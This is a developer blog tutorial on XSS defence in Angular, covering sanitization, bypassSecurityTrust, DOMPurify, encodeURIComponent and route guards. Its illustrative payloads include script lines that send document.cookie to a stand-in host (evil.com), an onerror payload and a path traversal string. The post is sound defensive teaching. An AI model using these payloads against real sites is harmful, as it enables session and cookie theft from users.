---
title: "Web Security for Angular Developers, Part 1: XSS"
date: "2025-10-10"
description: "XSS is still the most common web vulnerability. Here's how it works, what Angular protects you from automatically, and where you still need to think for yourself."
tags: ["angular", "security", "typescript"]
---

Cross-site scripting has been on the OWASP Top 10 for two decades. Frameworks have gotten better, but XSS hasn't gone away. Angular handles a lot automatically, but there are still gaps you need to close yourself.

## What XSS Is

The three types share one root cause: attacker-controlled content ends up executing as code.

**Reflected XSS** happens when a server reads a value from the request and echoes it back into the HTML response without encoding it. An attacker crafts a link, someone clicks it, and the script in the URL runs in their browser.

```
https://example.com/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>
```

**Stored XSS** is worse because the payload doesn't require a crafted link. The attacker posts a comment, fills in a profile field, or submits any user-generated content. The script gets saved to the database and served to every visitor who views that content.

```html
<!-- Saved comment content, rendered server-side without encoding -->
Nice post!
<script>
  fetch("https://evil.com?c=" + document.cookie);
</script>
```

**DOM-based XSS** stays entirely on the client. No server involvement needed. The page's own JavaScript reads attacker-controlled data and writes it directly to the DOM.

```javascript
// Attacker sends: https://example.com/#<img src=x onerror=alert(document.cookie)>
document.getElementById("message").innerHTML = location.hash.slice(1);
```

The common thread: a trust boundary is crossed. Data treated as a string gets interpreted as code.

## What Angular Does For You

Angular's template compiler provides meaningful protection by default.

**Interpolation is always text, never HTML.** When you use `{{ value }}`, Angular encodes the output as a text node. Angle brackets, quotes, and script tags are escaped before they reach the DOM.

```html
<!-- userInput = '<script>alert(1)</script>' -->

<!-- Safe: Angular escapes the content -->
<p>{{ userInput }}</p>
<!-- Renders as: &lt;script&gt;alert(1)&lt;/script&gt; -->

<!-- Unsafe: raw DOM manipulation bypasses Angular entirely -->
<p id="output"></p>
```

```typescript
// This is outside Angular's control
document.getElementById("output")!.innerHTML = userInput; // XSS
```

**Property bindings to sensitive sinks are sanitized.** Angular recognizes security-sensitive contexts and strips unsafe content before it reaches the DOM. This applies to `[innerHTML]`, `[href]`, `[src]`, and `[style]`.

```typescript
@Component({
  template: `
    <div [innerHTML]="userHtml"></div>
    <a [href]="userLink">click</a>
  `,
})
export class ExampleComponent {
  // Angular sanitizes this: strips <script>, event handlers, javascript: URLs
  userHtml = "<b>bold</b><script>alert(1)</script>";

  // Angular sanitizes this: javascript:alert(1) becomes unsafe:javascript:alert(1)
  userLink = "javascript:alert(1)";
}
```

You will see a warning in the console when Angular sanitizes something. That warning is useful. It means untrusted content hit a sensitive sink.

**Angular treats all bound values as untrusted by default.** There is no opt-in required for protection. The burden is on you to explicitly mark something as trusted, which means bypassing sanitization is a visible, deliberate act.

## When You Need to Bypass Sanitization

Sometimes you have HTML that must be rendered as HTML. A CMS, a markdown processor, a rich text editor. If the content is genuinely yours and you control the pipeline end-to-end, bypassing sanitization is legitimate.

```typescript
import { Component, inject } from "@angular/core";
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";

@Component({
  selector: "app-article",
  template: `<div [innerHTML]="safeContent"></div>`,
})
export class ArticleComponent {
  private sanitizer = inject(DomSanitizer);

  // Only use this for content you own and control
  safeContent: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(
    this.articleService.getRenderedHtml(),
  );
}
```

The rule is strict: only bypass for content you control end-to-end. Never for anything that passed through a user input field, even after validation. Validation can be bypassed. Sanitization should still happen.

If you are storing user-generated HTML, sanitize it server-side before it touches the database. [DOMPurify](https://github.com/cure53/DOMPurify) is the standard choice for this. Sanitize on write, not on read, so even if your rendering logic changes the content is already clean. Then, if you need to render that pre-sanitized HTML in Angular, bypass is appropriate because you already cleaned it.

```typescript
import DOMPurify from "dompurify";
const comment = DOMPurify.sanitize(userHtml);
// Angular component: content is pre-sanitized, bypass is safe here
safeComment: SafeHtml = this.sanitizer.bypassSecurityTrustHtml(comment);
```

## `encodeURIComponent` and Path Traversal

Path traversal is not XSS, but it is a related injection vulnerability that often appears alongside it. User input in URLs is another injection surface. If you interpolate a value directly into a URL path, an attacker can supply `../../admin` and change which resource gets requested.

```typescript
// Vulnerable: id could be '../../admin' or '../users/other-user'
const url = `/api/users/${id}`;

// Safe: encodeURIComponent encodes /, ., and everything else that matters
const url = `/api/users/${encodeURIComponent(id)}`;
```

The same applies to query parameters:

```typescript
// Vulnerable
const url = `/api/search?q=${userInput}`;

// Safe
const url = `/api/search?q=${encodeURIComponent(userInput)}`;
```

When using Angular's `HttpClient`, pass query parameters through the `params` option rather than interpolating them. HttpClient encodes them correctly for you.

```typescript
import { HttpClient, HttpParams } from "@angular/common/http";
import { inject } from "@angular/core";

const http = inject(HttpClient);

// Angular encodes userInput automatically
http.get("/api/search", {
  params: new HttpParams().set("q", userInput),
});
```

One thing to know about the two encoding functions: `encodeURI` is designed for full URLs and intentionally leaves `/`, `?`, `&`, `#`, and `:` unencoded. That makes it wrong for encoding parameter values. Always use `encodeURIComponent` for individual values inside a URL.

```typescript
encodeURI("hello/world?foo=bar"); // 'hello/world?foo=bar'  (slashes untouched)
encodeURIComponent("hello/world?foo=bar"); // 'hello%2Fworld%3Ffoo%3Dbar'  (fully encoded)
```

## Validating Route Parameters

Angular's router gives you whatever string appears in the URL. It does not validate that `:id` is actually a valid ID. Passing that raw value to your API is a mistake.

Use a functional guard to validate route parameters before the component activates. If the value does not match the expected format, redirect to a not-found route rather than letting the request proceed.

**Numeric ID:**

```typescript
import { inject } from "@angular/core";
import { CanActivateFn, Router } from "@angular/router";

export const numericIdGuard: CanActivateFn = (route) => {
  const router = inject(Router);
  const id = route.paramMap.get("id");

  if (!id || !/^\d+$/.test(id)) {
    return router.createUrlTree(["/not-found"]);
  }

  return true;
};
```

**UUID/GUID:**

```typescript
const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

export const uuidGuard: CanActivateFn = (route) => {
  const router = inject(Router);
  const id = route.paramMap.get("id");

  if (!id || !UUID_PATTERN.test(id)) {
    return router.createUrlTree(["/not-found"]);
  }

  return true;
};
```

Register the guard in your route definition:

```typescript
const routes: Routes = [
  {
    path: "users/:id",
    component: UserDetailComponent,
    canActivate: [numericIdGuard],
  },
];
```

A guard that rejects unexpected input is also useful for debugging. Seeing a redirect to /not-found during development is a clear signal that a link is broken rather than a silent failure.

---

This is part 1 of 4. Part 2 covers [Content Security Policy and Trusted Types](/blog/web-security-csp-trusted-types), which are the browser-level controls that limit what scripts can run even if XSS does get through.
